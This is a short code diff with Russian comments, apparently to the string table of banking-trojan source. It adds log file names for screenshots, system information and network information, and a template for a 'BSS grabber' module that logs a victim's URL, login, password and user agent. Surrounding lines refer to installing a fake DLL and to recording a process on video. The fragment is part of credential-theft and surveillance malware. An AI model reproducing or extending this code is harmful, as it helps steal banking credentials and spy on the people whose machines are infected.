@@ -61,6 +61,11 @@ CSSTR StrPrefixFileName[] = "mnprsdd.dat"; // Файл хранения префикса
 CSSTR CommandInstallFakeDLL[] = "installfakedll";
 
 
+// Имена файлов, для добавления в лог
+CSSTR StrLogFileScreenShot[]  = "Screen.png";
+CSSTR StrLogFileInformation[] = "Info.txt";
+CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";
+
 
 // Имена функций библиотеки видеозаписи.
 CSSTR VideRecFuncRecordProcess[]  = "StartRecPid";
@@ -83,6 +88,15 @@ CSSTR HTTPOctetStream[]            = "application/octet-stream";
 // Строки модуля AzConfig
 #ifdef AzConfigH
 	CSSTR AzConfigParamUserName[] = "%az_user%";
+#endif
+
+
+// Строки модуля BSS грабера
+#ifdef BSSH
+	CSSTR BSSLogTemplate[] = "Url: %s\r\n\r\n"
+							 "Login:    %s\r\n"
+							 "Password: %s\r\n\r\n"
+							 "UserAgent: %s\r\n";
 #endif
 
 
